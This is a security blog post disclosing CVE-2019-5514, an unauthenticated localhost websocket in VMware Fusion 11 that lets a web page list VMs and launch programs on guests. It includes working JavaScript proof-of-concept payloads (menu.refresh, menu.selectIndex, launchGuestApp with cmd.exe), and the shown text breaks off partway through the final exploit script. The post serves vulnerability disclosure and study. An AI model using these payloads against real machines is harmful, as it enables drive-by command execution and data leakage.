<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="author" content="Csaba Fitzl">
    
    

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2019-5514 - VMware Fusion 11 - Guest VM RCE"/>
<meta name="twitter:description" content="TL;DR You can run an arbitrary command on a VMware Fusion guest VM through a website without any priory knowledge. Basically VMware Fusion is starting up a websocket listening only on the localhost. You can fully control all the VMs (also create/delete snapshots, whatever you want) through this websocket interface, including launching apps. You need to have VMware Tools installed on the guest for launching apps, but honestly who doesn’t have it installed."/>

    <meta property="og:title" content="CVE-2019-5514 - VMware Fusion 11 - Guest VM RCE" />
<meta property="og:description" content="TL;DR You can run an arbitrary command on a VMware Fusion guest VM through a website without any priory knowledge. Basically VMware Fusion is starting up a websocket listening only on the localhost. You can fully control all the VMs (also create/delete snapshots, whatever you want) through this websocket interface, including launching apps. You need to have VMware Tools installed on the guest for launching apps, but honestly who doesn’t have it installed." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://theevilbit.github.io/posts/vmware_fusion_11_guest_vm_rce_cve-2019-5514/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-03-31T00:00:00+00:00" />
<meta property="article:modified_time" content="2019-03-31T00:00:00+00:00" />


    
      <base href="https://theevilbit.github.io/posts/vmware_fusion_11_guest_vm_rce_cve-2019-5514/">
    
    <title>
  CVE-2019-5514 - VMware Fusion 11 - Guest VM RCE · theevilbit blog
</title>

    
      <link rel="canonical" href="https://theevilbit.github.io/posts/vmware_fusion_11_guest_vm_rce_cve-2019-5514/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.28d751104f30c16da1aa1bb04015cbe662cacfe0d1b01af4f2240ad58580069c.css" integrity="sha256-KNdREE8wwW2hqhuwQBXL5mLKz&#43;DRsBr08iQK1YWABpw=" crossorigin="anonymous" media="screen" />
    

    

    

    

    
    
    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">

    <meta name="generator" content="Hugo 0.111.3">
  </head>

  <body class=" ">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://theevilbit.github.io/">
      theevilbit blog
    </a>
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/posts/">Posts</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/shield/">Shield.app</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/tags/">Tags</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/categories/">Categories</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/about/">About</a>
          </li>
        
      
      
    </ul>
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">CVE-2019-5514 - VMware Fusion 11 - Guest VM RCE</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2019-03-31T00:00:00Z'>
                March 31, 2019
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              10 minutes read
            </span>
          </div>
          <div class="categories">
  <i class="fas fa-folder"></i>
    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>

          <div class="tags">
  <i class="fas fa-tag"></i>
    <a href="https://theevilbit.github.io/tags/vmware/">vmware</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/fusion/">fusion</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/rce/">rce</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/vulnerability/">vulnerability</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/websocket/">websocket</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/rest-api/">rest api</a></div>

        </div>
      </header>

      <div>
        <h2 id="tldr">TL;DR</h2>
<p>You can run an arbitrary command on a VMware Fusion guest VM through a website without any priory knowledge. Basically VMware Fusion is starting up a websocket listening only on the localhost. You can fully control all the VMs (also create/delete snapshots, whatever you want) through this websocket interface, including launching apps. You need to have VMware Tools installed on the guest for launching apps, but honestly who doesn’t have it installed. So with creating a javascript on a website, you can interact with the undocumented API, and yes it’s all unauthenticated.</p>
<h2 id="original-discovery">Original discovery</h2>
<p>I saw a tweet a couple of weeks ago from @CodeColorist: <a href="https://twitter.com/CodeColorist">CodeColorist (@CodeColorist) on Twitter</a>, talking about this issue - he was the one discovering it, but I didn’t have time to look into this for a while. When I searched it again, that tweet was removed. I found the same tweet on his Weibo account (~Chinese Twitter): <a href="https://www.weibo.com/u/5639360171?refer_flag=1005050010_&amp;is_hot=1">CodeColorist Weibo</a>. This is the screenshot he posted:</p>
<p><img src="https://theevilbit.github.io/images/VMware_Fusion_11_Guest_VM_RCE_CVE-2019-5514/0069Ebc7ly1g05ubkth7hj30u50hhgqo.jpg" alt="image1"></p>
<p>What you can see here is that you can execute arbitrary commands on a guest VM through a web socket interface, which is started by <code>amsrv</code> process. I would like to give him full credits for this, what I did later is just building on top of this information.</p>
<h2 id="amsrv">AMSRV</h2>
<p>I used ProcInfoExample <a href="https://github.com/objective-see/ProcInfoExample">GitHub - objective-see/ProcInfoExample: example project, utilizing Proc Info library</a> to monitor what kind of processes are starting up, when running VMware Fusion. When you start VMware both vmrest (VMware REST API) and amsrv will be started:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-03-05 17:17:22.434 procInfoExample<span style="color:#555">[</span>10831:7776374<span style="color:#555">]</span> process start:
</span></span><span style="display:flex;"><span>pid: <span style="color:#f60">10936</span>
</span></span><span style="display:flex;"><span>path: /Applications/VMware Fusion.app/Contents/Library/vmrest
</span></span><span style="display:flex;"><span>user: <span style="color:#f60">501</span>
</span></span><span style="display:flex;"><span>args: <span style="color:#555">(</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;/Applications/VMware Fusion.app/Contents/Library/amsrv&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;-D&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;-p&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f60">8698</span>
</span></span><span style="display:flex;"><span><span style="color:#555">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2019-03-05 17:17:22.390 procInfoExample<span style="color:#555">[</span>10831:7776374<span style="color:#555">]</span> process start:
</span></span><span style="display:flex;"><span>pid: <span style="color:#f60">10935</span>
</span></span><span style="display:flex;"><span>path: /Applications/VMware Fusion.app/Contents/Library/amsrv
</span></span><span style="display:flex;"><span>user: <span style="color:#f60">501</span>
</span></span><span style="display:flex;"><span>args: <span style="color:#555">(</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;/Applications/VMware Fusion.app/Contents/Library/amsrv&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;-D&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#c30">&#34;-p&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f60">8698</span>
</span></span><span style="display:flex;"><span><span style="color:#555">)</span>
</span></span></code></pre></div><p>They seem to be related, especially because you can reach some undocumented VMware REST API calls through this port. As you can control the Application Menu through the amsrv  process, I think this is something like “Application Menu Service”. If we navigate to <code>/Applications/VMware Fusion.app/Contents/Library/VMware Fusion Applications Menu.app/Contents/Resources</code> we can find a file called app.asar, and at the end of the file there is a node.js implementation related to this websocket that listens on port 8698. It’s pretty nice that you have the source code available in this file, so we don’t need to do hardcore reverse engineering.</p>
<p>If we look at the code it reveals that indeed the VMware Fusion Application Menu will start this amsrv process on port 8698, or if that is busy it will try the next available open and so on.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">const</span> startVMRest <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>   log.info(<span style="color:#c30">&#39;Main#startVMRest&#39;</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">if</span> (vmrest <span style="color:#555">!=</span> <span style="color:#069;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>      log.warn(<span style="color:#c30">&#39;Main#vmrest is currently running.&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">const</span> execSync <span style="color:#555">=</span> require(<span style="color:#c30">&#39;child_process&#39;</span>).execSync;
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">let</span> port <span style="color:#555">=</span> <span style="color:#f60">8698</span>; <span style="color:#09f;font-style:italic">// The default port of vmrest is 8697
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>   <span style="color:#069;font-weight:bold">let</span> portFound <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">false</span>;
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">!</span>portFound) {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">let</span> stdout <span style="color:#555">=</span> execSync(<span style="color:#c30">&#39;lsof -i :&#39;</span> <span style="color:#555">+</span> port <span style="color:#555">+</span> <span style="color:#c30">&#39; | wc -l&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#366">parseInt</span>(stdout) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>         portFound <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">true</span>;
</span></span><span style="display:flex;"><span>      } <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>         port<span style="color:#555">++</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>   <span style="color:#09f;font-style:italic">// Let&#39;s store the chosen port to global
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>   global[<span style="color:#c30">&#39;port&#39;</span>] <span style="color:#555">=</span> port;
</span></span><span style="display:flex;"><span>   <span style="color:#069;font-weight:bold">const</span> spawn <span style="color:#555">=</span> require(<span style="color:#c30">&#39;child_process&#39;</span>).spawn;
</span></span><span style="display:flex;"><span>   vmrest <span style="color:#555">=</span> spawn(path.join(__dirname, <span style="color:#c30">&#39;../../../../../&#39;</span>, <span style="color:#c30">&#39;amsrv&#39;</span>), [
</span></span><span style="display:flex;"><span>      <span style="color:#c30">&#39;-D&#39;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#c30">&#39;-p&#39;</span>,
</span></span><span style="display:flex;"><span>      port
</span></span><span style="display:flex;"><span>   ]);
</span></span></code></pre></div><p>We can find the related logs in the <code>VMware Fusion Application Menu</code> logs:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2019-02-19 09:03:05:745 Renderer#WebSocketService::connect: <span style="color:#555">(</span>url: ws://localhost:8698/ws <span style="color:#555">)</span>
</span></span><span style="display:flex;"><span>2019-02-19 09:03:05:745 Renderer#WebSocketService::connect: Successfully connected <span style="color:#555">(</span>url: ws://localhost:8698/ws <span style="color:#555">)</span>
</span></span><span style="display:flex;"><span>2019-02-19 09:03:05:809 Renderer#ApiService::requestVMList: <span style="color:#555">(</span>url: http://localhost:8698/api/internal/vms <span style="color:#555">)</span>
</span></span></code></pre></div><p>This confirms the web socket and also a rest API interface.</p>
<h2 id="rest-api---leaking-vm-info">REST API - Leaking VM info</h2>
<p>If we navigate to the URL above (<code>http://localhost:8698/api/internal/vms</code>), we will get a nicely formatted JSON with the details of our VMs:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;id&#34;</span>: <span style="color:#c30">&#34;XXXXXXXXXXXXXXXXXXXXXXXXXX&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;processors&#34;</span>: <span style="color:#f60">-1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;memory&#34;</span>: <span style="color:#f60">-1</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;path&#34;</span>: <span style="color:#c30">&#34;/Users/csaby/VM/Windows 10 x64wHVCI.vmwarevm/Windows 10 x64.vmx&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;cachePath&#34;</span>: <span style="color:#c30">&#34;/Users/csaby/VM/Windows 10 x64wHVCI.vmwarevm/startMenu.plist&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;powerState&#34;</span>: <span style="color:#c30">&#34;unknown&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>This is already an information leak where an attacker can get information about our user ID, folders, and VM names, and their basic information. The code below can be used to display information. If we put this JS into any website, and a host running Fusion visits it, we can query the REST API.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> url <span style="color:#555">=</span> <span style="color:#c30">&#39;http://localhost:8698/api/internal/vms&#39;</span>; <span style="color:#09f;font-style:italic">//A local page
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> xhr <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> XMLHttpRequest();
</span></span><span style="display:flex;"><span>xhr.open(<span style="color:#c30">&#39;GET&#39;</span>, url, <span style="color:#069;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// If specified, responseType must be empty string or &#34;text&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>xhr.responseType <span style="color:#555">=</span> <span style="color:#c30">&#39;text&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xhr.onload <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span> () {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (xhr.readyState <span style="color:#555">===</span> xhr.DONE) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (xhr.status <span style="color:#555">===</span> <span style="color:#f60">200</span>) {
</span></span><span style="display:flex;"><span>            console.log(xhr.response);
</span></span><span style="display:flex;"><span>            <span style="color:#09f;font-style:italic">//console.log(xhr.responseText);
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>            <span style="color:#366">document</span>.write(xhr.response)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>xhr.send(<span style="color:#069;font-weight:bold">null</span>);
</span></span></code></pre></div><p>If we look more closely on the code, we find these additional URLs that will leak further info:
<code>'/api/vms/' + vm.id + '/ip'</code> - This will give you the internal IP of the VM, but it will not work on an encrypted VM or if it’s powered off.
<code>'/api/internal/vms/' + vm.id</code> - This is the same info you get via the first URL discussed, just limiting info to one VM.</p>
<h2 id="websocket---rce-with-vmuuid">Websocket - RCE with vmUUID</h2>
<p>This is the original POC published by @CodeColorist.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#555">&lt;</span>script<span style="color:#555">&gt;</span>
</span></span><span style="display:flex;"><span>ws <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> WebSocket(<span style="color:#c30">&#34;ws://127.0.0.1:8698/ws&#34;</span>);
</span></span><span style="display:flex;"><span>ws.onopen <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> payload <span style="color:#555">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;name&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;menu.onAction&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;object&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;11 22 33 44 55 66 77 88-99 aa bb cc dd ee ff 00&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;userInfo&#34;</span><span style="color:#555">:</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#c30">&#34;action&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;launchGuestApp:&#34;</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#c30">&#34;vmUUID&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;11 22 33 44 55 66 77 88-99 aa bb cc dd ee ff 00&#34;</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#c30">&#34;representedObject&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;cmd.exe&#34;</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			};
</span></span><span style="display:flex;"><span>			ws.send(JSON.stringify(payload));
</span></span><span style="display:flex;"><span>		};
</span></span><span style="display:flex;"><span>ws.onmessage <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span>(data) {
</span></span><span style="display:flex;"><span>	console.log(JSON.parse(data.data));
</span></span><span style="display:flex;"><span>	ws.close();
</span></span><span style="display:flex;"><span>	};
</span></span><span style="display:flex;"><span><span style="color:#555">&lt;</span><span style="color:#a00;background-color:#faa">/script&gt;</span>
</span></span></code></pre></div><p>In this POC you need the UUID of the VM to to start an application. The vmUUID is the <code>bios.uuid</code> that you can find in the <code>vmx</code> file. The ‘problem’ with this is that you can’t leak the vmUUID and brute forcing it would be practically impossible. You need to have VMware Tools installed on the guest for this to work, but who doesn’t have it? If the VM is suspended or shutted down, VMware will nicely start it for us. Also the command will be queued until the user logs in, so even if the screen is locked we will be able to run this command once the user logged in.
After some experimentation I noticed that if I remove the <code>object</code> and <code>vmUUID</code> elements, the code execution still happens with the last used VM, so there is some state information saved.</p>
<h2 id="websocket---infoleak">Websocket - infoleak</h2>
<p>After starting reversion and following the traces what web sockets will call, and what are the other options in the code, it started to be clear that you have full access to the application menu, and you can fully control everything. Checking the VMware Fusion binary it becomes clear that you have other menus with other options.</p>
<pre tabindex="0"><code>                     aMenuupdate:
00000001003bedd2         db         &#34;menu.update&#34;, 0                            ; DATA XREF=cfstring_menu_update
                     aMenushow:
00000001003bedde         db         &#34;menu.show&#34;, 0                              ; DATA XREF=cfstring_menu_show
                     aMenuupdatehotk:
00000001003bede8         db         &#34;menu.updateHotKey&#34;, 0                      ; DATA XREF=cfstring_menu_updateHotKey
                     aMenuonaction:
00000001003bedfa         db         &#34;menu.onAction&#34;, 0                          ; DATA XREF=cfstring_menu_onAction
                     aMenurefresh:
00000001003bee08         db         &#34;menu.refresh&#34;, 0                           ; DATA XREF=cfstring_menu_refresh
                     aMenusettings:
00000001003bee15         db         &#34;menu.settings&#34;, 0                          ; DATA XREF=cfstring_menu_settings
                     aMenuselectinde:
00000001003bee23         db         &#34;menu.selectIndex&#34;, 0                       ; DATA XREF=cfstring_menu_selectIndex
                     aMenudidclose:
00000001003bee34         db         &#34;menu.didClose&#34;, 0                          ; DATA XREF=cfstring_menu_didClose
</code></pre><p>These can be all called through the WebSocket. I didn’t went ahead to discover every single option on every single menu, but you can pretty much do whatever you want (make snapshots, start VMs, delete VMs, etc…) if you know the vmUUID. This was a problem as I didn’t figure out how to get that, and without it, it’s not that useful.</p>
<p>The next interesting option was <code>menu.refresh</code>. If we use the following payload:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> payload <span style="color:#555">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;name&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;menu.refresh&#34;</span>,
</span></span><span style="display:flex;"><span>			};
</span></span></code></pre></div><p>We will get back some details about the VMs and pinned apps, etc..</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#309;font-weight:bold">&#34;key&#34;</span>: <span style="color:#c30">&#34;menu.update&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#309;font-weight:bold">&#34;value&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;vmList&#34;</span>: [
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#309;font-weight:bold">&#34;name&#34;</span>: <span style="color:#c30">&#34;Kali 2018 Master (2018Q4)&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#309;font-weight:bold">&#34;cachePath&#34;</span>: <span style="color:#c30">&#34;/Users/csaby/VM/Kali 2018 Master (2018Q4).vmwarevm/startMenu.plist&#34;</span>
</span></span><span style="display:flex;"><span>      },
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#309;font-weight:bold">&#34;name&#34;</span>: <span style="color:#c30">&#34;macOS 10.14&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#309;font-weight:bold">&#34;cachePath&#34;</span>: <span style="color:#c30">&#34;/Users/csaby/VM/macOS 10.14.vmwarevm/startMenu.plist&#34;</span>
</span></span><span style="display:flex;"><span>      },
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#309;font-weight:bold">&#34;name&#34;</span>: <span style="color:#c30">&#34;Windows 10 x64&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#309;font-weight:bold">&#34;cachePath&#34;</span>: <span style="color:#c30">&#34;/Users/csaby/VM/Windows 10 x64.vmwarevm/startMenu.plist&#34;</span>
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    ],
</span></span><span style="display:flex;"><span>    <span style="color:#309;font-weight:bold">&#34;menu&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#309;font-weight:bold">&#34;pinnedApps&#34;</span>: [],
</span></span><span style="display:flex;"><span>      <span style="color:#309;font-weight:bold">&#34;frequentlyUsedApps&#34;</span>: [
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#309;font-weight:bold">&#34;rawIcons&#34;</span>: [
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span><span style="color:#a00;background-color:#faa">(...)</span>
</span></span></code></pre></div><p>This is a bit less and more what we can see through the API discussed earlier. So more info leak.</p>
<h2 id="websocket---full-rce-without-vmuuid">Websocket - full RCE (without vmUUID)</h2>
<p>The next interesting item was the <code>menu.selectIndex</code>, it suggested that you can select VMs, it even had a relatated code in the app.asar file, which told me how to call it:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>   <span style="color:#09f;font-style:italic">// Called when VM selection changed
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>   selectIndex(index<span style="color:#555">:</span> number) {
</span></span><span style="display:flex;"><span>      log.info(<span style="color:#c30">&#39;Renderer#ActionService::selectIndex: (index:&#39;</span>, index, <span style="color:#c30">&#39;)&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#069;font-weight:bold">this</span>.checkIsFusionUIRunning()) {
</span></span><span style="display:flex;"><span>         <span style="color:#069;font-weight:bold">this</span>.send({
</span></span><span style="display:flex;"><span>            name<span style="color:#555">:</span> <span style="color:#c30">&#39;menu.selectIndex&#39;</span>,
</span></span><span style="display:flex;"><span>            userInfo<span style="color:#555">:</span> { selectedIndex<span style="color:#555">:</span> index }
</span></span><span style="display:flex;"><span>         });
</span></span><span style="display:flex;"><span>      }
</span></span></code></pre></div><p>If we called this item, as suggested above, and then tried to launch an app in the guest, we could instruct which guest to run the app in. Basically we can select a VM with this call.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> payload <span style="color:#555">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;name&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;menu.selectIndex&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;userInfo&#34;</span><span style="color:#555">:</span>	{
</span></span><span style="display:flex;"><span>			<span style="color:#c30">&#34;selectedIndex&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;3&#34;</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			};
</span></span></code></pre></div><p>The next thing I tried if I can use the <code>selectedIndex</code> directly in the <code>menu.onAction</code> call, and it turned out that yes I can. It also became clear that the vmList I get with <code>menu.refresh</code> has the right order and indexes for each VM.</p>
<p>In order to gain a full RCE:</p>
<ol>
<li>Leak the list of VMs with <code>menu.refresh</code></li>
<li>Launch an application on the guest by using the index</li>
</ol>
<p>The full POC:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#555">&lt;</span>script<span style="color:#555">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ws <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> WebSocket(<span style="color:#c30">&#34;ws://127.0.0.1:8698/ws&#34;</span>);
</span></span><span style="display:flex;"><span>ws.onopen <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">//payload to show vm names and cache path
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	<span style="color:#069;font-weight:bold">const</span> payload <span style="color:#555">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;name&#34;</span><span style="color:#555">:</span><span style="color:#c30">&#34;menu.refresh&#34;</span>,
</span></span><span style="display:flex;"><span>			};
</span></span><span style="display:flex;"><span>			ws.send(JSON.stringify(payload));			
</span></span><span style="display:flex;"><span>		};
</span></span><span style="display:flex;"><span>ws.onmessage <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">function</span>(data) {
</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">//document.write(data.data);
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	console.log(JSON.parse(data.data));
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">var</span> j_son <span style="color:#555">=</span> JSON.parse(data.data);
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">var</span> vmlist <span style="color:#555">=</span> j_son.value.vmList;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">var</span> i;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> (i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> vmlist.length; i<span style="color:#555">++</span>) { 
</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">//payload to launch an app, you can use either the vmUUID or the selectedIndex
